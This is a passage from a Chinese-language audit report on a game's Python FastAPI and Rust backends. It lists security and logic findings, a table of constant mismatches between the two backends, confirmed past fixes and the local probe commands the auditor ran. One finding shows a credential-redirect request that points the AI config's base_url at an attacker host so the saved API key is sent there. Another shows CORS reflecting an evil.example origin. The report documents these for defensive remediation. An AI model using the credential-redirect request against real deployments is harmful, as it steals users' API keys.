  （我实测写入的 `slot_-1.json`、`slot_999999.json`、`slot_3.json`、`slot_5.json` 已全部删除。）
- 建议修复：`SlotReq.slot: int = Field(1, ge=1, le=5)`；`save_slots` 与 save/load 用同一枚举。

### E-18 [P2] `/api/ai_config` 先写盘后探测、且省略 key 即保留旧 key（有权者可重定向凭据）

- 位置：`backend/server.py:778-823`（`key_to_save = req.api_key.strip() or 旧 key`，`796`；写盘 `804`；探测 `813`）
- 证据：[确认] 实测 `csrf_probe.py`：

```
1) 正常 JSON 配置: 200 {"ok":true,"available":true,...,"has_key":true}
1) 其后端探测请求落在: [{"path":"/v1/chat/completions","auth":"Bearer sk-victim-KEY-123456"}, ×2]
2) text/plain + 恶意 Origin（不带 key）: 422 {"type":"model_attributes_type",...}   ← 跨站简单请求被拒
2) 新地址是否收到已存 key: []
```

即：**跨站（无 token 场景）盲发凭据重定向已被 FastAPI 的 JSON 体校验挡住**（重要：该向量不可利用）；
但**有权调用者**（持 token 或本机进程）`POST /api/ai_config {"base_url":"http://attacker/v1"}`
（不带 key）→ 配置写成"真 key + 攻击者地址"，紧接着 `probe(force=True)` 把真 key 发到攻击者端点。
与 E-3 串联即变成"未授权远程凭据外泄"。另：探测失败也不回滚配置（U22 实测写入 `http://127.0.0.1:1/v1` 后返回 200）。
- 建议修复：`base_url` 变更且未同时提供显式 `api_key` 时要求二次确认（或只允许同时提交 key）；
  探测失败回滚；`/api/ai_config` 只接受带 token 的调用。

### E-19 [P2] Rust token 不 `strip`（两端语义不同）

- 位置：`songzuo_server/src/server.rs:150-152` vs `backend/server.py:63`
- 证据：[确认] 静态 + 实测 V1/V2：Python `SONGZUO_SERVER_TOKEN="  s3cret  "` + `Authorization: Bearer s3cret` → **200**
  （`_AUTH_TOKEN = (... or "").strip()`）；Rust `std::env::var("SONGZUO_SERVER_TOKEN").ok().filter(|s| !s.trim().is_empty())`
  → token 含空格，`want = "Bearer   s3cret  "`，需原样匹配（实测 Python 端原样匹配是 401）。
  另：Rust `constant_time_eq` 长度不等即提前返回（`server.rs:92-95`），只泄漏长度，可接受。
  两端"token 全空白即视为未设置"一致（实测 V3 → 回环放行 200）。
- 建议修复：Rust 侧 `token.map(|t| t.trim().to_string())`。

### E-20 [P2] `SONGZUO_CORS_ORIGINS='*'` + credentials → 回显任意 Origin

- 位置：`backend/server.py:42-55`
- 证据：[确认] 实测 V4：`SONGZUO_CORS_ORIGINS='*'` 时 `GET /api/readouts`（Origin: `https://evil.example`）→
  `Access-Control-Allow-Origin: https://evil.example` + `Access-Control-Allow-Credentials: true`
  （Starlette 在 `allow_credentials=True` 且 `*` 时回显 Origin）→ 任意站点可读全部只读端点响应。
  **默认配置是安全的**：T16/T17 恶意 Origin 无 ACAO；`final_checks.py` 实测 OPTIONS 预检
  → `400 Disallowed CORS origin`（无 ACAO）。
- 影响：仅在运维按"惯例"设成 `*` 时打开洞（而 Rust 端默认就是 `Any`，见 E-10）。
- 建议修复：启动时若 `SONGZUO_CORS_ORIGINS` 含 `*` 则告警或拒绝；
  或显式在文档里禁止 `*`（本项目 CORS 白名单而非 `*` 是刻意设计：`server.py:41` 注释）。

### E-21 [P2] Rust 仓廪恒等断言符号写反（debug 构建每月 panic）

- 位置：`songzuo_server/src/settle.rs:523-529`
- 证据：[确认] 静态：

```rust
523: state.granary = (state.granary - grain_out).clamp(0.0, state.granary_cap);
526: debug_assert!(
527:     (granary_before - state.granary) as i64 == (canal - grain_out) as i64, ...);
```

净变化 `granary_before - granary_after = grain_out - canal`，断言却要求 `canal - grain_out` → 仅当
`canal == grain_out` 成立（另有 `clamp` 饱和更易触发）。`cargo run --release` 下 `debug_assert` 被编译掉，
故只影响 `cargo test`/debug 运行。
- 建议修复：改为 `(state.granary - granary_before) as i64 == (canal - grain_out) as i64`。

### E-22 [P2] Rust `ai.rs` 孤儿文件 + 过期注释

- 位置：`songzuo_server/src/ai.rs`（整文件）；`main.rs:14-19`；`server.rs:282`
- 证据：[确认] 静态：`Select-String '^mod '` 仅得 `commands/constants/save/server/settle/state` 六个模块，
  全 crate 搜 `crate::ai|mod ai|ai::` **零命中** → `ai.rs` 不参与编译。同时
  `server.rs:282` 注释"**AI 模块已移除**（纯占位…）"与磁盘上仍在的 `ai.rs`（含 `AI_AVAILABLE`/`monthly_report` 等）
  相矛盾；`Cargo.toml` 亦保留未启用的 `reqwest` 与 `llm` feature。
  （历史 R2-18 提及的 tkinter 残留：全 `src\*.rs` 搜 `tkinter|Tk |tk\.` **零命中** —— 该项确已清理。）
- 建议修复：删除 `ai.rs`（或补 `mod ai;` 并接线），移除 `reqwest`/`llm`。

### E-23 [P2] `HttpBackend` 的重试/回退语义缺陷

- 位置：`backend/client.py:313-346,352-353,355-369,416-421`
- 证据：[确认] 静态。使用面说明：`HttpBackend` 在 `game/` 内除 `BackendClient.create()` 外**无调用点**
  （前端 Electron 有自己的 TS 客户端，实测其端点集合见 E-9），故为联调/测试面代码，降为 P2。
  1) `save_slots()` 从不发请求，直接本地 `cmd.save_slots()`（`416-421`）→ 远程模式下"存档列表来自玩家本机"
     与"save/load 作用于服务端磁盘"相互矛盾；服务端 `/api/save_slots` 事实上无客户端。
  2) `_NON_IDEMPOTENT`（`352-353`）漏 `/api/new_game`（另含 `/api/meter/reset`、`/api/ai_config`）→
     5xx 重试会把已重置的局再重置一次。
  3) `_is_presend_error`（`356-369`）把 `ConnectionResetError/ConnectionAbortedError/ConnectionError`
     当作"请求已确认未送达"，但连接重置可发生在**服务端已处理完、读响应时**；且 `342-345` 的该重试分支
     **没有** `startswith(self._NON_IDEMPOTENT)` 守卫（只有 5xx 分支有）→ 非幂等端点 `advance/action` 可能被重复执行
     （重复推进回合/重复下诏），与该修复试图避免的 C4 问题同源。
- 建议修复：`_is_presend_error` 只保留 `ConnectionRefusedError`/`socket.gaierror`；
  在两个重试分支统一加非幂等守卫；`new_game` 计入非幂等前缀。

### E-24 [P2] Rust 事件系统占位且 `active_events` 永不清空

- 位置：`songzuo_server/src/commands.rs:121-144,147-197`；`settle.rs` 全程无 `active_events` 清理
- 证据：[确认] 静态：

```rust
126: if rng.gen_bool(0.25) {
133:     choices: vec![],            // 空选项占位
136:     state.active_events.push(ev);
```

`resolve_event` 对空 `choices` 取 `get(0)` → `Value::Null` → 不进入 `as_object()` → 返回空串（`commands.rs:160-196`），
且只有 `resolve_event` 会 `retain` 移除事件。`settle_turn`/`settle_events` 都不清理。
- 影响：每月 25% 概率新增、永不淘汰 → 快照与内存随回合无界增长；前端拿到 0 选项事件（交互死路）。
- 建议修复：事件加 `expire_turn`/回合末清理；补 `choices` 数据或不下发空事件。

### E-25 [P2] 全局锁内做 AI 联网调用（可用性）

- 位置：`backend/server.py:321-345`（及 `356-362`、`373-382`、`577-605`、`620-654`、`703-711`）
- 证据：[确认] 静态：所有 handler 都是同步 `def`（FastAPI 走 threadpool，**不阻塞事件循环** —— 该点无缺陷），
  但 `with _lock:` 覆盖了 `_backend.advance(... _get_ai())` 等整段 AI 调用；客户端超时 30s
  （`ai/client_utils.py:43` `_http_post_json(timeout=30)`）、`probe` 15s（`ai/client.py:333`）、
  `fetch_available_models` 12s（`:382`），`/api/ai_config` 已正确把 probe 移出锁（`server.py:809-815`）。
- 影响：一次慢 AI 响应把单会话内**所有**端点（含 `/health` 之外的读端点）串行阻塞最长 30s+，
  叠加 E-16 无体积上限 → 可被放大为拒绝服务。
- 建议修复：AI 调用移出全局锁（先在锁内取 state 快照，联网后回锁落状态），或给 AI 路径单独限流/短超时。

### E-26 [P2] Rust 存档目录/损坏档处理与 Python 不一致

- 位置：`songzuo_server/src/save.rs:17-24,60-69` vs `core/save_load.py:221-239`
- 证据：[确认] 静态：Rust 默认 `/data/saves`（Windows 上解析为当前盘符根 `\data\saves`），
  Python 为 `content.data.SAVE_DIR = Documents\宋祚\saves`（`data.py:25`）——即使同机也永不重合；
  Rust `load_game` 对损坏档只 `Err(e.to_string())`（serde 解析原文），无 `.corrupt` 备份（Python 有）。
  Rust 的 `.tmp + rename` 原子写已实现（`save.rs:46-55`），该项历史修复**确认有效**。
- 建议修复：文档明确两目录互不相干；Rust 损坏档同样改名备份并返回可读错误。

### E-27 [P2] `backend/client.py` 同文件内对 Rust 后端自相矛盾

- 位置：`backend/client.py:11` vs `292-297`
- 证据：[确认] 静态：模块头声称"**原 Rust 方案未采**"（还标注"据实更新"），
  而 `HttpBackend` 类文档写"songzuo_server（Rust 简化版 MVP，仅核心端点…）"，且该 crate 真实存在（`src\*.rs` 8 文件 ~81KB）。
  这是"注释被改错"的回归（历史 R2-18 的另一处）。
- 建议修复：统一为"Rust 后端为并行简化实现（仅 6 端点）"。

---

## Rust ↔ Python 常量对拍表

Python 取 `content/data.py`（下称 P），Rust 取 `songzuo_server/src/constants.rs`（下称 R）。
Rust 的路级数据由 `diff_constants.py` 正则抽取并与 `content.data.PREFECTURE_INFO` 逐项比对。

### A. 标量常量

| 常量 | Python 值(文件:行) | Rust 值(文件:行) | 是否一致 | 影响 |
|---|---|---|---|---|
| TREASURY_START | 5_000_000 (data.py:155) | 5_000_000 (constants.rs:13) | ✅ | — |
| INNER_TREASURY_START | 1_000_000 (data.py:156) | 1_000_000 (constants.rs:14) | ✅ | — |
| PRESTIGE_START | 55 (data.py:68) | 55 (constants.rs:15) | ✅ | — |
| ARRIVAL_BASE | 0.45 (data.py:145) | 0.45 (constants.rs:16) | ✅ | — |
| EMPEROR_HEALTH_START | 75 (data.py:95) | 75 (constants.rs:17) | ✅ | — |
| GRANARY_START | 15_000_000 石 (data.py:1555) | 1500.0 「万石」(constants.rs:18) | ⚠️ 单位不同（数值等价）×1e4 | 跨端读档太仓变 1500 石（E-14） |
| GRANARY_START_CAP | 20_000_000 石 (data.py:1556) | 2000.0 (constants.rs:19) | ⚠️ 同上 | 同上 |
| ANNUAL_TAX_BASE | 80_000_000 (data.py:157) | 80_000_000 (constants.rs:24) | ✅ 数值 | 但 Python 已改由农 POP 计税，Rust 仍用它算役钱（见 B-4） |
| TAX_POLL_RATIO | 0.10 (data.py:328) | 0.10 (constants.rs:25) | ✅ | — |
| COMMERCE_TAX_RATE_MIN | 0.05 (data.py:340) | 0.05 (constants.rs:26) | ✅ | — |
| COMMERCE_TAX_RATE_MAX | 0.40 (data.py:341) | 0.40 (constants.rs:27) | ✅ | — |
| TAX_COEFF_MIN/MAX | 0.75 / 1.25 (data.py:1734-1735) | 0.75 / 1.25 (constants.rs:28-29) | ✅ | — |
| **MONTHLY_EXP_CIVIL_BASE** | **880_000** (data.py:165) | **1_300_000** (constants.rs:30) | ❌ **+47.7%** | 月常支膨胀，Rust 国库更快转负 |
| PAY_CASH_BASE | 2_000_000 (data.py:1745) | 2_000_000 (constants.rs:31) | ✅ 数值 | 单位口径被 `max` 误用（E-12） |
| PAY_GRANARY_BASE | 800_000 (data.py:1744) | 800_000.0 (constants.rs:32) | ✅ | Rust 未使用该常量（本色走逐路明细） |
| SALT_COIN_UNIT / SALT_PROFIT_PER_JIN | 0.055 贯/斤，公式 `/12` (data.py:197, econ.py:514) | 3090.0，公式**无 /12** (constants.rs:34, settle.rs:230) | ❌ 名/单位/公式皆不同 | 两侧盐课≈同量级但不可对拍，改产量数据即分叉 |
| SALT_CAPACITY_BASE | 185_000_000 斤/年 (data.py:198) | 231（索引） (constants.rs:35) | ❌ **量纲不同** | adequacy 各算各的 |
| SALT_POP_BASE | 80_000_000 口 (data.py:199) | 5065.0 万 (constants.rs:36) | ❌ 且与 R 自身 Σ人口 4995 不符 | Rust 开局 pop_scale=0.986≠1 |
| SALT_PRICE_FLOOR/CEIL | 0.6 / 1.3 (data.py:200-201) | 0.6 / 1.3 (constants.rs:37-38) | ✅ | — |
| **WINE_COIN_BASE** | **600_000** (data.py:204；game_state.py:211 赋 state.wine_tax) | **100_000** (constants.rs:41) | ❌ **÷6** | 内帑月入差 50 万贯 |
| SUI_GONG_ANNUAL | 300_000 (data.py:1813) | 300_000 (constants.rs:42) | ✅ 数值 | Rust 无 `_sui_gong_mult` 外交倍率 |
| **TAX_COLOR_RATE** | **0.40** (data.py:171) | **1.0** (constants.rs:43) | ❌ | 见 E-11：折色×2.5 且本色未减 |
| LAND_TAX_RATE_BENEFIT | 0.10 (data.py:176) | 0.10 (constants.rs:44) | ✅ | — |
| **SPARROW_RAT** | **0.012** (data.py:1647) | **0.01** (constants.rs:45) | ❌ | 存粮损耗低估 |
| IMPERIAL_SHARE | 0.10 (data.py:190) | 0.10 (constants.rs:46) | ✅ | — |
| CHANGPING_HIGH | 1.6 (data.py:1787) | 1.6 (constants.rs:47) | ✅ | — |
| **CHANGPING_LOW** | **0.9** (data.py:1788) | **0.6** (constants.rs:48) | ❌ | Rust 常平籴门槛过松（且 Rust price=price_level 近似，见下） |
| SOLDIER_GRAIN/PAY_PER_MONTH | 2.0 / 0.5 (data.py:181-182) | 2.0 / 0.5 (constants.rs:53-54) | ✅ 数值 | Rust 用「万兵」乘之（E-12 量纲） |
| OFFICIAL_PAY/GRAIN_PER_MONTH | 30 / 15 (data.py:183-184) | 30.0 / 15.0 (constants.rs:55-56) | ✅ 数值 | Rust 另 `/10000`（E-12） |
| CLERK_PAY/GRAIN_PER_MONTH | 2.0 / 1.5 (data.py:185-186) | 2.0 / 1.5 (constants.rs:57-58) | ✅ 数值 | 同上 |
| CLERK_PER_OFFICIAL | 8 (data.py:187) | 8 (constants.rs:59) | ✅ | Rust 未使用（硬编码 clerks） |
| CORRUPTION_MULT / BRIBE_FLOOR | 0.8 / 0.2 (data.py:188-189) | 0.8 / 0.2 (constants.rs:62-63) | ✅ | 贪腐折色/本色公式一致（econ.py:488-491 ↔ settle.rs:314-315,481） |
| COMMERCE_BASE | 350_000_000 (econ.py:53 硬编码) | 350_000_000.0 (constants.rs:66) | ✅ | — |
| MARITIME_TRADE_BASE | 20_000_000 (data.py:1506) | 20_000_000.0 (constants.rs:67) | ✅ | — |
| CANAL_MONTHLY_RATE | 0.90 (data.py:1643) | 0.90 (constants.rs:215) | ✅ | — |
| **CANAL_LOSS_BASE** | **0.06** (data.py:1648) | **0.04** (constants.rs:216) | ❌ | 漕运损耗低估 2 个百分点 |
| CANAL_LOSS_CORRUPT_WEIGHT | 0.06 (data.py:1649) | 0.06 (constants.rs:217) | ✅ 数值 | **Rust 未使用**（已自述为结构性差异） |
| TREASURY_CRISIS/COLLAPSE_LINE | 5_000_000 / 20_000_000 (data.py:369-370) | -5_000_000 / -20_000_000 硬编码 (settle.rs:59,63,386) | ✅ 语义 | 未抽常量（弱项：改一处漏一处） |

**不一致 9 项**（MONTHLY_EXP_CIVIL_BASE、TAX_COLOR_RATE、WINE_COIN_BASE、SPARROW_RAT、CANAL_LOSS_BASE、
CHANGPING_LOW、SALT_COIN_UNIT/SALT_PROFIT_PER_JIN、SALT_CAPACITY_BASE、SALT_POP_BASE），
其中 **SALT_* 三项为量纲/基准错位**而非单纯数值差；另 GRANARY_START/CAP 为「等价但单位不同」。

### B. 路级数据与公式（`default_prefectures()` ↔ `PREFECTURE_INFO`）

| 项 | Python | Rust | 是否一致 | 影响 |
|---|---|---|---|---|
| 路数/键 | 20 路（`PREFECTURE_LIST`，data.py:944） | 12 路（constants.rs:76-212） | ❌ | 缺 京畿路/京东东/京东西/河东路/淮南东/淮南西/荆湖北/利州/夔州/广南西；键名 `东京开封府`/`河东`/`京西` 与 Python 不一致 |
| households Σ | 20_000_000 户 | 9990 万（×1e4 = 99.9M） | ❌ ×5 | Rust 户数口径整体偏大 5 倍 |
| population Σ | 80_000_000 口 | 4995 万（×1e4 = 49.95M） | ❌ −37.6% | 盐课 pop_scale、民生显示失真 |
| land Σ | 468_000_000 亩 | 46800 万（×1e4 相符） | ⚠️ 汇总相符、**逐路不符** | 京畿 P 35,590,000 vs R 4200万；只对齐了汇总 |
| monthly_tax Σ | 5_480_000 贯/月 | 548 万贯（×1e4 相符） | ⚠️ 汇总相符、逐路不符 | 京畿 P 420,000 vs R 46万；且 P 已将其降级为派生锚 |
| grain Σ | 707_301_250 石/年 | 11750 万石（×1e4 = 117.5M） | ❌ −83% | 本色粮/折色税基全错 |
| storage Σ | 60_100_000 石 | 6010 万石（×1e4 相符） | ⚠️ 汇总相符 | — |
| hidden_land Σ | 117_000_000 亩 | 6180 万（×1e4 = 61.8M） | ❌ −47% | 隐田/税基不符 |
| yields.salt Σ | 185_000_000（含 **负值**：京畿 -100000） | 231（全正，京畿 +10） | ❌ 量纲 + 符号 | 见 A 表 salt 行 |
| officials / clerks | 无该字段，运行时 `round(households×0.00135)` 及 ×8（game_state.py:491-492）→ 全国约 2.7 万官 / 21.6 万吏 | 每路硬编码 1 / 8（Σ=13 / 104） | ❌ ~2000× | 俸禄基数失真；疑抄自旧档兜底 `save_load.py:498-499` |
| local_finance | `monthly_tax × 0.25`（京畿 105,000 贯，game_state.py:496-497） | 等于 storage（东京 540 万贯） | ❌ ~51× | pay_ratio 分子爆炸 → pr 恒 1.0（两侧巧合同结果） |
| grain_yield | **字段不存在**（由 `grain`/`ROAD_YIELD` 派生） | 每路硬编码 11760/7680/…（constants.rs 各路） | ❌ 无对应来源 | 本色粮计算基于自造数据 |
| 计征节奏 | 本色仅 3/6/9 月，`/3`（econ.py:346-360） | 每月 `/12`（settle.rs:405） | ⚠️ 年总量等价、季节性被抹平 | 已自述简化，可接受 |
| 折色税基 | 田赋本色 × 折色率 × 粮价（econ.py:337-338） | `monthly_tax` 锚 × 1.0（settle.rs:215-217） | ❌ | 见 E-11 |
| 本色折色互补 | `×(1-TAX_COLOR_RATE)`（econ.py:357） | 无（settle.rs:405-410） | ❌ | 见 E-11 |
| 役钱基数 | 农 POP 人口 ×税率（econ.py:205-206；`settlement_steps.py:2811` 处同源） | `ANNUAL_TAX_BASE × 0.10 / 12`（settle.rs:201） | ❌ | 与人口脱钩 |
| commerce 人口项 | `population // 100_000`（econ.py:58） | `(population / 10)`（settle.rs:164） | ❌ **÷10 与 ÷100000，差 1e4** | 工商税基多算 ~800 万贯/年 |
| effective_cash_out | `= personnel_cash`（econ.py:241-246） | `cash_out.max(personnel_cash)`（settle.rs:334） | ❌ | 见 E-12 |
| 加俸摊还 | `financed = local + payraise_budget*share`（econ.py:447） | `... + payraise_budget*share/10000`（settle.rs:305,472） | ❌ 差 1e4 | 加俸效果几乎无效 |
| 军粮/军饷实体 | 逐 army_unit × branch_std（econ.py:367-397） | 逐路 `garrisons` 简单相加（settle.rs:277-283,447-453） | ❌ | Rust 无 army_units 模型 |
| 到账率 authority | `get_prestige_level(prestige)` 权威指数（econ.py:311） | `prestige/100` 近似（settle.rs:183） | ❌ 近似 | 到账率偏差 |
| 常平仓 | 区域粮价 + 籴粜（settlement_steps.py:222,1466+） | `price = price_level.max(0.4)`，CHANGPING_LOW=0.6 时需 price<0.6 才触发（settle.rs:534-549） | ❌ | 默认 price=1.0 → 永不触发（仅结构保留） |
| 盐课公式 | `Σsalt/12 × 0.055 × pf × arrival × pop_scale`（econ.py:505-514） | `Σsalt × 3090 × pf × arrival × pop_scale`（settle.rs:220-230） | ❌ | 见 A 表 |
| 难度预设 | `DIFFICULTY_PRESETS` 生效 | `new_game()` 仅写 `difficulty` 字符串（state.rs:491-499，commands.rs:26 TODO） | ❌ | Rust 难度选择无数值效果（P2） |

---

## 已验证「确实修好」的历史项（不重复报告）

| 历史修复 | 结论 | 证据 |
|---|---|---|
| 无 token 时仅放行回环 | ✅ 生效（但取值来源可被 XFF 污染 → E-3） | T1 200 / T8 401 / T9 401 |
| `hmac.compare_digest` 时序安全 | ✅ 已用（但有非 ASCII 崩溃 → E-15） | `server.py:94` |
| token 空串/全空白 ≡ 未设置 | ✅ 两端一致 | 实测 V3；`server.rs:150-152` |
| `/api/fetch_models` 不再回落服务端 Key 外联 | ⚠️ 代码逻辑正确但**从不执行**（E-4） | 实测 A/B |
| base_url 强制 http(s) | ✅ 生效 | T54/T55/T70 → 400 |
| `/api/save_slots`、`/api/readouts`、`/api/ai_config` 补鉴权 | ✅ 均已 `_require_auth` | `server.py:410,424,724` |
| 状态判空移入锁内 | ✅ 全部改状态端点一致 | `server.py:334-336,356-357,373-374,…` |
| `/api/ai_config` 联网探测移出锁 | ✅ | `server.py:788-815` |
| `/api/resolve_event` 按 title 反查 + 明确 404 | ✅ | 实测 T62 → 404 |
| 原子写、损坏档备份（Python） | ✅ `.tmp`+`os.replace`、`.corrupt` 备份实测生效 | U9；`save_load.py:183-199,228-239` |
| Rust `/api/*` 鉴权中间件 + `/health` 别名 | ✅ 代码在位（`server.rs:116-146,197`） | 静态（无 cargo） |
| Rust 存档 `.tmp`+rename 原子写 | ✅ | `save.rs:46-55` |
| Rust bind 失败不再 panic | ✅ `eprintln! + exit(1)` | `server.rs:202-209` |
| Rust `settle_granary` 删除二次 `settle_land_local` | ✅ 该调用确已删除 | `settle.rs:484-488` |
| Rust tkinter 残留 | ✅ 全文件零命中 | `Select-String 'tkinter'` |
| CORS 默认非 `*` + credentials | ✅ 默认白名单且预检拒绝 | OPTIONS 实测 400 |

## 我实际跑过的验证命令（全部可复现）

```powershell
# 0) 环境（每次 Python 前）
$env:PYTHONPATH=''; $env:PYTHONIOENCODING='utf-8'
Remove-Item Env:CODEBUDDY_TOOL_CALL_ID,Env:CODEBUDDY_SAFE_DELETE_BULK_STATE_DIR -ErrorAction SilentlyContinue
cd D:\codebuddy\sz\game

# 1) Rust 工具链核查（结论：不可用 → 仅静态审查）
cargo --version
Get-Command cargo
Test-Path "$env:USERPROFILE\.cargo\bin\cargo.exe"

# 2) 主 HTTP 探针：自起 4 个实例（:18080 无token / :18082 token / :18081 uvicorn 直挂 0.0.0.0 / :18085 入口校验）
#    + 攻击者 HTTP 服务器 :18083；跑完自动 terminate 全部
& 'D:\codebuddy\.audit-venv\Scripts\python.exe' 'D:\codebuddy\sz\_dev_tools\_scratch\audit-2026\http_probe.py'

# 3) 第二轮：load 毁状态 / 损坏档 / POST 端点 / token 空白 / CORS='*'
& 'D:\codebuddy\.audit-venv\Scripts\python.exe' 'D:\codebuddy\sz\_dev_tools\_scratch\audit-2026\probe2.py'

# 4) fetch_models NameError 与重定向凭据转发（含"注入缺失名字"反证）
& 'D:\codebuddy\.audit-venv\Scripts\python.exe' 'D:\codebuddy\sz\_dev_tools\_scratch\audit-2026\ssrf_probe.py'

# 5) 常量对拍（Python PREFECTURE_INFO ↔ Rust constants.rs）
& 'D:\codebuddy\.audit-venv\Scripts\python.exe' 'D:\codebuddy\sz\_dev_tools\_scratch\audit-2026\diff_constants.py'

# 6) 跨实现读档实测（patch SAVE_DIR 到临时目录，不碰玩家存档）
& 'D:\codebuddy\.audit-venv\Scripts\python.exe' 'D:\codebuddy\sz\_dev_tools\_scratch\audit-2026\rust_save_interop.py'

# 7) 末轮：_ai_failures 死分支 / 回环判定边界 / 默认 CORS 预检
& 'D:\codebuddy\.audit-venv\Scripts\python.exe' 'D:\codebuddy\sz\_dev_tools\_scratch\audit-2026\final_checks.py'

# 8) 凭据重定向与跨站简单请求（text/plain）验证
& 'D:\codebuddy\.audit-venv\Scripts\python.exe' 'D:\codebuddy\sz\_dev_tools\_scratch\audit-2026\csrf_probe.py'

# 9) 进程与端口清理核查（确认无本审查残留）
Get-NetTCPConnection -State Listen | Where-Object { $_.LocalPort -ge 18080 -and $_.LocalPort -le 18099 }
Get-Process python | Select-Object Id,StartTime
Test-Path 'D:\codebuddy\sz\game\ai_config.json'      # False
```

原始输出：`http_probe.py` → `probe-results.json`/`probe-stdout.txt`；`probe2.py` → `probe2-results.json`；
常量 → `constants-diff.txt`；读档 → `interop.txt`；末轮 → `final.txt`；凭据 → `csrf.txt`；
各实例日志 `server-*.log` / `server2-*.log` / `server3-*.log` / `server4.log`。
